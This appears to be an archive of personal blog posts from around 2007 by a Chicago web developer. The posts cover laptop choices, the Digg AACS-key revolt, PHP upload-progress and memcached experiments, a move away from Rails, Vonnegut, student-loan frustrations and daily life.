<p>I have been in LOVE with the IBM laptops since I used one back at CK. They are obviously the best workstation laptops. I am a bit scared since Lenovo took over the manufacturing of them, but what I have seen and heard from my friends tells me I shouldn&#8217;t be worried. I like how they look, I like the features they support and I like how easy they are for hardware compatibility. I don&#8217;t really like the price - but what can you do.</p>

<p>however&#8230;</p>

<p>I also LOVE the black macbook. I currently have a pre-intel macmini and I really enjoy it. I love that it has native Unix capabilities and I really love the productivity options that are in OSX. I constantly sync my phone with iSync. In fact that is the only reason I have a macmini now. I think that OSX is a very good development environment and I think I am ready for a change such as that. I am really scared about not having two mouse buttons.</p>

<p>So it seems that with either laptop, I am going to be able to support 90% if not 99% of the software I use on a regular basis. So software support isn&#8217;t that big of an issue. I guess what is an issue is which will be the better laptop. Which will be the longer lasting and which is ultimately more powerful.</p>

<p>Both laptops are about the same price as I would configure them.</p>

<p>While I was at the mysql conf, I started looking around at various laptops that people used. It seemed that everyone used either an IBM or a Apple, with a few Dells and randoms sprinkled in for good measure. So it seems that both are popular among opensource and engineers.</p>

<p>Let me know your thoughts.. I am open to anything - even (maybe) going with another brand. <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:7628523d-099f-4bfe-9fd0-03093a18651d' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]laptops, linux, ubuntu, osx, mac, desktop development, development, purchase, lenovo, apple, t60, macbook[/tags]</p></p>

<p>So anyway - DIGG being a community based news site, the users rebelled and basically took over the site, posting similar news stories. Most with the evil evil key that is so coveted by the AACS. So DIGG is made so that getting content to the home page is very hard. In fact, it is made so that what has in fact happened - is very hard to do. However, the community rebelled and has pulled off a miraculous stunt by making almost every single homepage story to be the same as the censored story.</p>

<p>This is the problem with communities.</p>

<p>When you have a community you create a covenant with that community saying that you are leaving the community in control of the content, and that you trust the community to handle all of the content related tasks. This covenant is very important. So when the community does something that isn&#8217;t to insane, contrary to the goal of the site, illegal or even just plain crazy and then the community owners break the ultra important covenant they hold with the community - it is very easy, and probably very important to that community to rebel. The community must rebel to prove that they are still in control. To dispel the lack of power that they actually have.</p>

<p>So now DIGG has shown that the users don&#8217;t actually have any control. That they are really just tools to create movement on the site. This could ultimately damage DIGG and it reputation with its users. It will be interesting to see how this plays out.</p>

It is not a big car. It is tiny and has good safety ratings. Hiromi is currently driving it back from colorado. I am excited to see it. I am not sure but it may feature a continuously variable transmission. Which would be really neat. Regardless - it will not be a gas guzzler and will be small enough to park on city streets. </p>

                <p>Ivan and I are in Santa Clara this week for the <a href='http://mysqlconf.com/'>mysql conference</a>. We are going to learn how to make threadless so fast that it breaks hearts. That is really fast. We got here a bit earlier today and have been waiting for our rooms to become ready. The weather is great - about the same as Chicago and I think it will only get better as we stay here.</p>

<p>I am excited to see what the mysql peeps have to offer and it will be fun to hang out with the <a href='http://rackspace.com'>rackspace</a> people as well. I think on Thursday, Ivan and I will be giving a tech talk at <a href='http://video.google.com/googleplex.html'>Google</a> about skinnycorp stuff. So that should be interesting.</p>

<p>I will be updating with various thoughts and what not throughout the week. Especially if <a href='http://tangent.org/index.pl?node_id=506'>something really cool</a> or <a href='http://www.petefreitag.com/item/628.cfm'>exciting</a> strikes me.</p>

<p>If anyone is here as well - leave a comment and lets get together and get a drink or something. It should be fun. And we have <a href='http://farm1.static.flickr.com/130/353765540_e7071fa52e.jpg?v=0'>stickers</a>&#8230; oh so many stickers!</p>

<p>btw, It always cracks me up that santa can be rearranged into satan. heh. <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:beab804c-274d-4c4b-aed2-9d5a969ab192' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]mysql, mysqlconf, skinnycorp, threadless, santa clara, california, travel[/tags]</p></p>

                <p>So I have been using twitter for a minute. I really enjoy it. I got all my friends on it and quite a number of my family using it. Its fun. I love getting updates and what not. However, the one thing I wish I could do with twitter is set the status of my various IM clients by sending a &#8220;tweet&#8221; to twitter. It would be awesome. You could then have your AIM status or Gtalk status show your latest twitter. Or better yet, you could have a semblance of presence with based on twitter pushed to your various statuses.</p>

<p>My buddy <a href='http://derek.broox.com/'>Derek</a> and I whipped up a <a href='http://x.aim.com/laim/'>LAIM</a> plugin to do this. But it is so far only for AIM and I don&#8217;t use LAIM. heh. But it worked for a bit. Ultimately what I want is a gaim plugin that will set my statuses for each account to my twitter status. Or even a standalone app. Something simple and fast.</p>

<p>The outcome would be the ability to use your twitter status to participate a little bit in the presence part of being online. How many of us have workstations that sit online all night with us gone. It would be neat to hover over one of your buddies names and see what they are up to now, not 5 hours ago.</p>

<p>So lets build this!</p>

            </div>
            <div class="PostContent">
                <p>Today I decided I was going to build the asynchronous picture uploader for one of our new projects. I had installed the <a href='http://pecl.php.net/package/uploadprogress'>PECL Uploadprogress extension</a> awhile ago and I just needed to build an example and then build it into our app.</p>

<p>However, my plan was spited by the opensource gods who delivered very little documentation about how to use the <a href='http://pecl.php.net/package/uploadprogress'>PECL Uploadprogress extension</a>. So here is my quick writeup and example.</p>

<p>After crawling for 30 minutes through the C++ source of the Uploadprogress extension, I figured out what the heck was actually happening. The basic set of events is that an upload occurs. with that upload post is a hidden input that has a unique ID in it. The Uploadprogress extension then assigns the progress of that upload to that ID. Then when you call the uploadprogress_get_info() function with that unique id, the response is the upload progress. So, the two key pieces of information are this:</p>

<p>The function that accesses the upload progress is: <blockquote>uploadprogress_get_info($unique_id);</blockquote> It takes a string that is the uploads unique id. To set this id you include the following hidden input in your upload form: <blockquote>&lt;input type="hidden" name="UPLOAD_IDENTIFIER" value="&lt;?php echo $some_uniq_id; ?&gt;" /&gt;</blockquote> This sets the ID of the upload that the uploadprogress extension then can track. THIS IS VERY IMPORTANT. As far as I could tell, if you entered a different ID name, your uploadprogress_get_info($unique_id); will not work. If there is no upload, or it is complete uploadprogress_get_info() returns not a array.</p>

<p>So the pseudo php code is like this</p>
<strong>upload.php</strong><blockquote>&lt;form crap&gt;
&lt;input type="hidden" name="UPLOAD_IDENTIFIER" value="&lt;?php echo $some_uniq_id; ?&gt;" /&gt;
&lt;input type="file" ....... /&gt;
&lt;input type="submit" .... /&gt;
&lt;/form&gt;</blockquote><strong>progress.php</strong><blockquote>&lt;?
$uniq_id = $_GET["id"];
print_r(uploadprogress_get_info($unique_id));
?&gt;</blockquote>
<p>so you would load up upload.php and upload a huge file. Then in another browser window you would view progress.php?id=$some_uniq_id and theoretically you would get a raw progress response from uploadprogress_get_info().</p>

<p>heh.</p>

<p>So I have created a working (at least on my server) example of this for yall to test. I have placed it in my code archive under <a href='http://stuff.harperreed.org/?path=code%2Fphp_upload_progressbar'>php_upload_progressbar</a>. This example uses prototype and YUI components to achieve totally asynchronous uploads and then has a CSS progress bar to handle the upload progress. The upload is through an Iframe using the YUI container.js and the updaters are using prototype. I imagine I could have used just YUI, but I know prototype better and it was easy to rock out in about thirty seconds. I have attempted to thoroughly comment both my <a href='http://stuff.harperreed.org/?path=code%2Fphp_upload_progressbar&amp;text=progress.php'>progress.php</a> and my <a href='http://stuff.harperreed.org/?path=code%2Fphp_upload_progressbar&amp;text=upload.php'>upload.php</a> so it should be somewhat clear on what is going on.</p>

<p>Let me know if you have questions or comments. I haven&#8217;t placed a live example anywhere because I don&#8217;t really feel comfortable having crazy people uploading random porn to my servers. however, I would love to help peeps that are having issues getting the example to run.</p>

Hiromi and I hung out a bunch. We went and saw Grindhouse. it was entertaining. I didn't like planet terror. I realized half way through that I really don't like a lot of Rodriguez's horror movies. I like Sin City and his none zombie movies. Not his zombie movies. However, Death proof was AMAZING. So awesome. Hiromi was not as sad about planet terror after watching those ladies kick some ass. It was great. </p>

<p>In my book, I am more annoyed than happy with rails. So I stopped using it.</p>

<p>When I did stop using it, my servers were happier. After converting all my applications I converted to rails back to PHP - my server load dropped amazingly. I didn&#8217;t even have big applications. Maybe one app that had a couple 1000 visits a day. nothing too fancy. but the little traffic it had really abused my server. annoying. One side effect of the PHP migration is that my applications responded a bit snappier - which in turn generated more pageviews. It was magical.</p>

<p>I do have to say that I was sad to be back in the wild west of scripting that PHP is. I missed my MVC and my activerecord. However, I wasn&#8217;t about to sacrifice what rails took from me.</p>
<a href='http://www.statsaholic.com/twitter.com'><img src='http://traffic.alexa.com/graph?u=twitter.com&amp;r=2m&amp;y=r&amp;z=1&amp;h=90&amp;w=205&amp;f=555555&amp;o=l&amp;o=f&amp;p=-1' border='0' align='right' alt='Twitter growth' /></a>
<p>So the other day, one of the <a href='http://al3x.net/'>twitter engineers</a> had a <a href='http://www.radicalbehavior.com/5-question-interview-with-twitter-developer-alex-payne/'>really great interview about twitter</a>, their growth and their future. It is very insightful and covers some interesting ground. It is always helpful to hear how other people are solving problems and it always helps the community to hear criticism and success. The interview had both of this. It explained how they had basically outgrown their ideas of growth and were dealing with scaling issues. He said that their issues were related to having too many mongrel connected to the database which was then killing things. This is not a new problem in the world of webapps. In fact, this very problem is where we at Threadless are having problems. And we are running PHP. OMG.</p>

<p>So obviously there is a performance hit when using rails. But there is a performance hit when using any interpreted language. And even more a performance hit when using a framework. and then it doesn&#8217;t help that ruby is slower. but these things don&#8217;t really mean that a site can&#8217;t scale. It just means that you have to solve the problems a bit more interesting (and being interesting might very well be moving to python).</p>

<p>This is rails chance to show the world that they can scale a real world app. That they are not second place to some weird guitar named framework. But I don&#8217;t think they will do that.</p>

<p>Personally, I think that the rails community blows. I think that they are not helpful and I don&#8217;t think they are willing to take criticism positively. I mean look at what erupted from this great developers smart interpretation of who his beloved application had scaling problems. The community rebelled and basically said that twitter needs to do the work themselves.</p>

<p>This is type of reaction is exactly my experience when dealing with rails. The difference that I experienced when I dealt with rails versus when I dealt with PHP, is that PHP people are like <blockquote>"Oh yea. this is why this happened. check out the solution."</blockquote> or maybe they are like <blockquote>"Oh shit. That is weird. Maybe try this. if you figure anything out let us know."</blockquote> but regardless of what the response nobody says: <blockquote>"Obviously you are doing it wrong. Its probably your database. fix it. "</blockquote> However, this is exactly how the rails community has responded to twitter&#8217;s issues. Nobody really constructively addressed the twitter issue. They all just waited until <a href='http://www.loudthinking.com/arc/000608.html'>DHH said his word</a>. and then blindly followed. <a href='http://www.loudthinking.com/arc/000610.html#comments'>They called the people who questioned trolls</a> and then jumped into line behind DHH. The twitter people even came to DHH&#8217;s blog and apologized for possibly misconstruing that rails was slow. however, rails is slow.</p>

<p>I think some of the best points on this whole thing is the following (paraphrased from somewhere <a href='http://laughingmeme.org/2007/04/12/twitter-ruby-and-scaling/'>1</a>, <a href='http://rc3.org/2007/04/twitter_develop.php'>2</a>, <a href='http://benbarren.blogspot.com/2007/04/all-of-us-working-on-twitter-are-big.html'>3</a>): <blockquote>Rails is great because it trades developer performance for framework performance. Rails is good enough for almost every application. However, if you get big enough - rails will suffer. If you are writing an app that may get big, you may want to choose a different framework.</blockquote> With that said, I am going to go play with <a href='http://webpy.org/'>web.py</a>.</p>

I was quite a bit young for the book, but it was a great follow up to &lt;a href=&quot;http://www.amazon.com/Catch-22-Novel-Simon-Schuster-Classics/dp/0684865130/ref=pd_bbs_sr_1/104-8140476-8316711?ie=UTF8&amp;amp;s=books&amp;amp;qid=1176360307&amp;amp;sr=1-1&quot;&gt;Catch-22&lt;/a&gt;. hah. I still remember Slapstick and think about it quite often.  &lt;p&gt;~ hi ho ~ &lt;p&gt;I think that is my Favorite Kurt Vonnegut book.  &lt;p&gt;Kurt Vonnegut made quite the impact on me.&amp;nbsp;My father was a big Vonnegut fan and recommended that I read his books constantly. As&amp;nbsp; grew older we were able to share the jokes, and the excitement of Vonnegut&apos;s novels. It was a great thing to share with your loved ones. I continue to push Kurt Vonnegut&apos;s books on to my friends and family as much as I can. His novels are always quirky and fun. They reminded me that life isn&apos;t always serious, even if serious things are happening.&amp;nbsp; The single biggest piece of knowledge I gleaned from his novels was the theme that&amp;nbsp;we need to treat people well. His books were a great commentary on why more humanist values are needed in our world. If anyone is wondering what is wrong with the world, read a bundle of Kurt Vonnegut, a couple Studs Terkel and Joseph Heller&apos;s Catch-22. You will be set right. &lt;p&gt;I once was able to meet and speak a small amount with Kurt Vonnegut when he spoke at a school in the Chicago suburbs. He talked about humanism and being old. He mentioned how he felt a humanist funeral should&amp;nbsp;be. It was very humorous. I took a picture of Kurt Vonnegut and me and gave&amp;nbsp;it to my father.  &lt;p&gt;In regards to death,&amp;nbsp; I feel that Kurt Vonnegut&apos;s version of death and afterlife is the closest to my own beliefs on the matter.&amp;nbsp;In Studs Terkel&apos;s book&amp;nbsp;&quot;&lt;i&gt;&lt;a href=&quot;http://www.amazon.com/Will-Circle-Unbroken-Reflections-Ballantine/dp/0345451201/ref=pd_bbs_sr_7/104-8140476-8316711?ie=UTF8&amp;amp;s=books&amp;amp;qid=1176360262&amp;amp;sr=8-7&quot;&gt;Will the Circle Be Unbroken? Reflections on Death, Rebirth, and Hunger for a Faith&lt;/a&gt;,&lt;/i&gt;&quot; Studs interviews Vonnegut on death and Vonnegut &lt;a href=&quot;http://speakingoffaith.publicradio.org/programs/studsterkel/vonnegut.shtml&quot;&gt;says the following&lt;/a&gt;: &lt;blockquote&gt; &lt;p&gt;What the freethinkers were are now called humanists. I am one. A humanist believes, because of Darwin, whose truths were so shocking, in making the most use of good science as possible. Humanists behave well without any expectation of either reward or punishment in an afterlife. We serve, as best we can, our community. When I was growing up, nobody ever said anything about Heaven, about an afterlife. They said that this life was enough. &lt;p&gt;I have experienced what happens when I die, and so have you. We call it sleep.&lt;/p&gt;&lt;/blockquote&gt;</pre>

                <p>So awhile back, a little before etech, Kathy Sierra was attacked by some Internet hoodlums who used hatespeech and made Kathy Sierra feel threatened. She decided not to go to etech and instead <a href='http://headrush.typepad.com/creating_passionate_users/2007/03/as_i_type_this_.html'>posted a blog entry about how she was scared of life and didn't feel like going outside</a>. I think her blog entry was good. It basically started a tidal wave of discussion about being mean and hateful on the Internet.</p>

<p>From this whole situation a <a href='http://radar.oreilly.com/archives/2007/04/draft_bloggers_1.html'>blogger code of conduct</a> was created by <font color='#0000ff'><a href='http://en.wikipedia.org/wiki/Tim_O%27Reilly'>Tim O'Reilly</a></font>. I hate codes of conduct. It seems to me that the coolest part of the Internet is that there are no rules. There is only personal accountability and often with anonymous comments and anonymous forums there is barely even that.</p>

<p>When I was a child, my parents taught my brother and I to treat everyone with common decency. It pretty much broke down to the golden rule. It set us up to think a bit about what we were saying before we did it. This basic tenet of humanism was rooted in Vonnegut and Heller. We just basically did whatever we needed to do, as long as we followed that rule.</p>

<p>The cool thing was that when we strayed into the territory of not treating people decent, our communities helped us get back on track. They talked to us, they yelled at us and they told us where we were wrong. This was the case when we were bullies, when we were bullied and when we were just helping people.</p>

<p>We didn&#8217;t need a code of conduct to grow up. And I don&#8217;t think that we as blogger&#8217;s need one now.</p>

<p>The whole meankids thing was a playground tactic. A group of weaker people picking on someone who had a stronger or more successful identity. This will always occur. However, it seemed like it was pretty quickly dismantled by the community. Call it a <a href='http://www.snpp.com/episodes/1F01.html'>mob</a>, or call it whatever you want. It solved itself.</p>

<p>I guess what I am saying is that before we as a community decide to adopt a huge number of rules and badges, lets first just decide to treat people decently. <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:3bd5b411-ee32-441b-aa42-01b8fba4cb6b' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]life, feelings, conduct, code, decency, stupid[/tags]</p></p>

                <p>I broke my blog the other day. It was a pain in the ass. I don&#8217;t really know what happened - just that it broke. So I was thinking, I hate upgrading my wordpress. I hate it. I agree 100% with <a href='http://www.mattcutts.com/blog/upgrading-wordpress/'>Matt Cutts</a> about how wordpress has one of the most clunky and cruft creating upgrade process. So annoying. And it gets even more annoying when you are doing it with 50 blogs. stupid friends. hah. So awhile ago I created this script which basically lets me just execute a small number of commands to upgrade a wordpress blog.</p>

<p>If a script isn&#8217;t really your thing, it seems like the best way to handle wordpress upgrades is to use SVN to do them. I am going to look into the best way to do that, but my experience so far in that experiment has shown me that the bleeding edge release of wordpress is not always a working release. ;)</p>
<a href='http://photomatt.net/'>Matt</a>
<p>So anyway. The script&#8230;</p>

<p>I am warning you that this script HAS KILLED AT LEAST ONE BLOG. hah. but it has also regularly upgraded at least 50 blogs as well. So.. use at your own risk. and feel free to modify and fix stuff that you see.</p>

<p>I am assuming that your web layout is: <blockquote>/ <em>- root of domain</em>
/web <em>- blogs webroot
</em>/archive  <em>- archive for old backups
</em></blockquote> If your layout differs it will not be too hard to change the vars and make the script work for you. The script will backup your wordpress DB, tar up your wordpress dir, download the newest version of wordpress, untar the new wordpress, and then move all your wp-content and what not into the new wordpress dir. It then puts all the backups into a dated folder in the archive dir. then cleans up a bit after itself.</p>

<p>The script does not account for any customizations at all. If you have any files that are placed in the webroot, or files that are not in their normal places, it will not work at all. Honestly - unless you know what you are doing and really want to play Russian roulette of the bash kind - I wouldn&#8217;t use this script. ;) <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>It has been a minute since I have blogged regularly. I don't really know why - but for some reason, I just haven't felt like blogging. I think this happens when a lot of going on in my life. Recently I have been really slammed with various projects outside of work and have been doing really exciting stuff inside of work. Mostly tech stuff, but it is all very interesting and quite engaging. I am working a lot more in cakePHP and playing a lot in python. fun stuff. I wish I had more to do in python. I love being challenged by neat programming languages. </p>

<p>So part of my daily routine of making sure we continue on this path is to constantly keep on the lookout for cool tech that will make our shit FAST. The newest one is <a href='http://www.danga.com/memcached/'>memcached</a>. a opensource product made by the <a href='http://www.danga.com/'>danga interactive</a>. Danga is the company that started livejournal and created a bunch of neat tools for making scalable websites.</p>

<p>I am using it with PHP and our caching class. It is pretty easy to use. We set up a memcached box with a bundle of ram, ran a couple memcached servers on it and then hook into it with the <a href='http://pecl.php.net/package/memcache'>PHP pecl extension for memcached</a>. The speed of the cache is madness. We tested it with a bunch of queries and were really impressed with the increase in speed. its nuts.</p>

<p>I have released a screen capture of our test here: <a href='http://flickr.com/photo_zoom.gne?id=430540094'>http://flickr.com/photo_zoom.gne?id=430540094</a>. The test results are thus: <blockquote>Cached read from shared nfs disk: 0.0032 seconds
Cached read from local disk: 0.0018 seconds
Cached read from memcached: 0.00042 seconds</blockquote> As you can see, memcached is a bit faster. ;)</p>

<p>The test was simply executing a largish query and caching it, then reading the results from the cache, then clearing the cached results.</p>

<p>We are using a modified object cache I made a minute ago. It is based off my <a href='http://code.google.com/p/nata2/wiki/ObjectbaseClass'>ObjectBase class</a> but made to emulate memcached. So it will work with or without a memcached server, which allows us to roll out the infrastructure and then just turn on the memcached servers for better performance. You can check out the <a href='http://nata2.googlecode.com/svn/branches/objectbase_class/class.objectbase.php'>source here</a>. I will be releasing it once its a bit more solid.</p>

<p>I can&#8217;t wait until we integrate it with all of our sites. I will be so happy and our sites will be rather snappy! <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:4c5a770a-1cda-46bb-9b04-ba2e669bdc2e' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]memcached, skinnycorp, threadless, php[/tags]</p></p>

                <p>Yesterday was pretty fun. It all started in the morning when I woke up and was able to wear the fancy new jeans Hiromi got me. Then I went to work and hung out. I just got my first memcached server and I got it running and hooked up to some of our code. It is really quite something. About 5-10 times faster than our current caching (but more on that later). While working on the memcached deal I got an email from Morgan telling about a Studs Terkel event at stop smiling magazine last night. I happily RSVPd was looking forward to it all day. </p>

                <p>So I have been sick for the last month. It is starting to get really tiring. I am bored of being sick. At first, I was like "oh awesome... I can't sleep and I have a stuffy nose, what a new experience." But now I am totally over the new cold feeling and just want it to go away. I even went to the doctor which is something I am totally against doing. So here I sit. Wishing I was better, cracked out of my mind on pseudoephedrine and playing computer. </p>

                <p>The other day, I decided to finish up a twitter hack idea I had and never fully executed. Awhile ago <a href='http://www.nata2.org/2006/12/12/how-to-hook-twitter-into-a-irc-channel/'>I made a bot that output the updates of my friends into my IRC channel</a>. I did this by writing a quick bot that would log into a dedicated AIM account which received updates from the twitter service. Then the bot would output these updates to my IRC channel. This was neat. It worked OK. the bot kept crashing though - I think because I didn't make it threaded so the aim connectivity was dependent on activity in the channel - or maybe the other way around. Well whichever reason - it wasn't that great of a hack. </p>

So anyway... My official&nbsp; attempt to better manage my finances all started about 6 months ago when Hiromi and I first got married. With her away for most of that time - I was able to get things in a more working order than they were before. So then when she arrived she wouldn't have to deal with the spidery cobwebbed world that was my banking. So I kinda got things in a reasonable state and I decided to start using quicken again. But like everytime I use quicken - it wasn't interesting enough to keep up with. So I started looking for alternatives. </p>

                <p>For the past couple weeks I have been slowly and surely reigning in all my finances and changing them to work with Hiromi and my new fancy joint account. Its pretty exciting and a big step for me in regards to finances. I usually manage my finances like I would a motorcycle - recklessly and without a helmet; but I have been trying to do everything the &#8220;correct&#8221; and have actually been reading blogs and what not to find out how to budget things efficiently and without losing money.</p>

<p>Anyway - today was &#8220;change the autodebit accounts on my student loans day.&#8221; So I called up Nelnet and they helped me. No problem. Didn&#8217;t even flinch or say anything shocking. So I got off the phone and thought &#8220;wow - loan people are OK.&#8221; HAH.</p>

<p>So then I called <a href='http://www.studentloan.org/'>Iowa Student Loan</a> and promptly got fucked.</p>

<p>Back in 2001 when my student loans went from deferment to repayment - Iowa Student Loan has a deal that was supposed to reward people who paid their loans on time. For a certain amount of consecutive student loan payments that were autodebited from your checking account, they would decrease your interest rate a certain small percentage. Nothing too big - something like .025% off - but when you have 70k of student loans, you pay attention to details like that. So I immediately signed up and started my autodebit plan. It worked really well and I went over 6 years without a missed payment or even an issue.</p>

<p>So I call today to change my checking account. First off, Iowa Student Loans mentions that it would take around 2 months for my payment info to be updated. And in the mean time, I will have to check both my statements and my checking account to see if the payment went through. So this seemed a bit archaic - especially since every sketchy porn site and other sketchy business out there can handle autodebit - it seemed a bit insane that these people were going to take 100 years to process something that seems like it would only take a couple minutes. So I question why this is, and apparently their autodebit system sends a test charge to make sure that the account is correct and then changes the account, after the correct test charge works. However they can only send the charge at one specific time only once per month. wtf. this seems insane.</p>

<p>But whatever, I can deal with this. So I casually ask, since there will be a break in my autodebit, if this will effect my percentage bonus. And lo and behold, by changing checking accounts, I will be ineligible for the autodebit bonus. Even though I have almost 7 years of autodebit and have never been an issue. Apparently they don&#8217;t offer the autodebit bonus any longer. And rather than treat their long time customers well they decided to experiment with being inane.</p>

<p>Now, in total, the amount I will be losing by not getting my interest rate bonus is around one to two thousand dollars. That isn&#8217;t a whole lot in the scheme of 70k. however. WTF. how does a company get off on treating their customers like this. If this were a phone company, I would pay the termination fee and leave. But sadly I cannot pay the termination fee and leave my student loan lender.</p>

<p>Fuckers.</p>

                <p>This weekend my parents visited. It was really awesome. They haven&#8217;t visited since Hiromi moved back - and they really wanted to see her. So they stopped by for a quick trip and some excellent dining.</p>

<p>They got in Thursday night - so Hiromi and myself went downtown and visited them at the Hard Rock Hotel and had a nice quick drink. They stayed on the same floor (the <a href='http://en.wikipedia.org/wiki/Frank_Zappa'>Frank Zappa</a> floor) and the exact same room as Hiromi and I - when we last stayed in the Hard Rock. heh. Weird.</p>

<p>So the excitement started on Friday. My parents came and met Hiromi for lunch. I wasn&#8217;t able to accompany because I was at <a href='http://www.fogodechao.com/'>Fogo De Chao</a> with the skinnyCorp eating an awesome spring Fogo lunch. Hiromi and my parents ended up going to <a href='http://www.smokinwoodys.com/'>Smokin Woody's</a> and then hanging out at the <a href='http://www.google.com/maps?hl=en&amp;rls=GGGL,GGGL:2006-25,GGGL:en&amp;q=red+eye+cafe&amp;near=Chicago,+IL&amp;radius=0.0&amp;latlng=41850000,-87650000,3524402088938722178&amp;sa=X&amp;oi=local&amp;ct=authority'>Red Eye cafe</a> that is next door to my place. They then walked down to skinnyCorp and hung out in Charlie&#8217;s booth and rocked out a bit. We ere able to snag a quick reservation for Green Zebra to start off our eating just right.</p>

<p>For those of you who have never been to <a href='http://www.greenzebrachicago.com/'>Green Zebra</a> - you should stop what you are doing and make a reservation right now. It is amazing. Totally awesome vegetarian friendly food. They have such a great menu and the atmosphere is really nice. I love it. My parents also loved it. Even Tag -who hates vegetarian food thought it was amazing. We spent a long time just hanging out and talking. The only downside is that green zebra was more than my parents airfare out to Chicago. hah.</p>

<p>After having such a nice dinner - Hiromi, Tag and myself went to <a href='http://sonotheque.net'>sonotheque</a> and had a couple too many drinks. heh. Then home.</p>

<p>Then on Saturday - we walked around and got hiromi a nice coat, ate at the South Water Kitchen. The <a href='http://www.southwaterkitchen.com/'>South Water Kitchen</a> is located right by the Hard Rock and we had a really nice brunch/lunch. The service was amazing and the food was simple. Afterwards we chilled out a bit and did some shopping and eventually made our way up to Clark and Foster to meet up with <a href='http://therats.org'>Matiss</a> and Erica at LaDonna for dinner.</p>
<a href='http://maps.google.com/maps?f=l&amp;hl=en&amp;q=ladonna&amp;near=chicago&amp;layer=&amp;ie=UTF8&amp;z=10&amp;ll=42.223433,-87.606354&amp;spn=0.386446,0.902252&amp;om=1&amp;iwloc=A&amp;iwd=1&amp;cid=41975552,-87668353,2873420247510877837'>LaDonna</a>
<p>We then all went home. Hiromi and I have been getting more and more sick and Saturday night was the peak of our sickness. We came home and watched <a href='http://imdb.com/title/tt0450259/'>Blood Diamond</a>. It was quite good. Really sad. Hiromi was sad to have a diamond ring after she watched it. What is interesting is how you cannot tell if your Diamond is <a href='http://en.wikipedia.org/wiki/Conflict_diamonds'>conflict</a> free. You just have to not have diamonds. Stupid <a href='http://en.wikipedia.org/wiki/De_Beers'>De Beers</a> and their monopoly. It is worth watching.</p>

<p>So Sunday came and Hiromi and I in our Nyquil induced slumber accidentally slept late. We finally met my parents about 1pm for lunch. We went to <a href='http://www.smithandwollensky.com/chicago.htm'>Smith and Wollensky's</a>, where we had an excellent steak lunch. It was not as light as our previous meals and was quite nice. I had a pepper encrusted filet and my father had the filet Oscar. Both quite good. My mom had amazing truffle mac and cheese and Hiromi had a really nicely prepared fish. It was awesome.</p>

<p>After lunch we went to Macy&#8217;s to check out <a href='http://usa.lush.com/cgi-bin/lushdb/index.html?lang=en_US&amp;dlang=en'>Lush</a> and to get some medicine at <a href='http://www.merz.com/'>Merz</a>. I have been a bit under the weather for the past couple weeks and Hiromi has been taking great care of me. She has picked up a number of <a href='http://www.google.com/search?q=hippie+medicine'>homeopathic</a> medicines and I really like it. I have taken to calling it hiromiopathic - because she takes such good care. So now that she is sick I need to step up and take the best care too.</p>

<p>After our quick little shopping excursion - we went to the worst movie I have ever seen. It was called <a href='http://www.rottentomatoes.com/m/astronaut_farmer/'>Astronaut Farmer</a>. Hands down the most cliche insane movie ever. It was so bad. I wished I could have fallen asleep. But we enjoyed the horror that it was.</p>

<p>To pay our selves back for witnessing such a horrible monstrosity that was Astronaut Farmer - we went to AVEC for dinner. <a href='http://www.avecrestaurant.com/'>Avec</a> is probably one of my favorite restaurants in the city. I love it. it has such a good atmosphere and the staff is always very nice and accommodating. And the food is amazing. We had some really great cheese and of course awesome olives. I had a really nice proscuitto and a really awesome parsnip dish. The dessert was an incredible grapefruit sorbet - it really topped off an amazing meal. So tasty.</p>

<p>So that brings us to now. It has been an amazing time. I am really glad that my parents were able to make it. The only thing that would have made it better is if <a href='http://dylanreed.org'>Dylan</a> and <a href='http://photodork.org'>Sarah</a> were here as well. But that will have to wait until another time.</p>

                <p>So we got gocarts at work. It is pretty awesome. I grew up with gocarts - so driving fast around is second nature and great fun. Everyday I come in and Jake is driving around our space in the gocart - zooming around desks and generally having a great time. I am surprised someone hasn&#8217;t died. but yea.</p>

<p>here are some videos.</p>

<p>The <a href='http://www.craigshimala.com/v/2274/skinnycart_64'>first</a> shows me and Jake driving the gocarts. especially fun is when I take off my pants to drive the gocart around the block. I didn&#8217;t want my pants to get dirty. yea know&#8230; <a href='http://www.craigshimala.com/v/2274/skinnycart_64'>here is the video.</a></p>

<p>The <a href='http://www.vimeo.com/clip:148137'>second video</a> is being chased by Jacobs death bronco. Jake almost dies. it is amazing. <a href='http://www.vimeo.com/clip:148137'>Check it out</a>.</p>

<p>I really can&#8217;t wait until the weather gets better and we can really unload the gocarts.</p>

<p>Hope you like them.</p>

                <p>So my blog has been slow for the past few months. It has been killing me. I run my own server - so I knew it was something that I did. However, I sadly thought that it was probably just the fact that I have a couple rather high bandwidth sites and only one server. I tried a lot of the &#8220;speed up wordpress&#8221; tricks and even installed and used wp-cache. but nothing worked.</p>

<p>Today I was doing some research on how to speed up threadless and our scaling issues. I was reading articles about how to speed up large scale web applications and I decided to look other places for scaling issue help. I often think that the articles that are written are not written by people who actually have to deal with large scale web apps - so I usually don&#8217;t really pay attention to what they say. So I started going to larger sites and seeing if I couldn&#8217;t find any information on how they scale and maintain speed while growing. I found a nice description of how <a href='http://www.mininova.org/faq#tech'>mininova speeds things up</a> and scales - its really nothing more than simple paragraph but it told me more than most whole articles. So <a href='http://www.mininova.org'>mininova</a> uses <a href='http://www.lighttpd.net/'>LightTPD</a> and <a href='http://eaccelerator.net/'>eAccelerator</a> to keep things quick. Since I don&#8217;t want to use LightTPD - I decided to check out eAccelerator.</p>

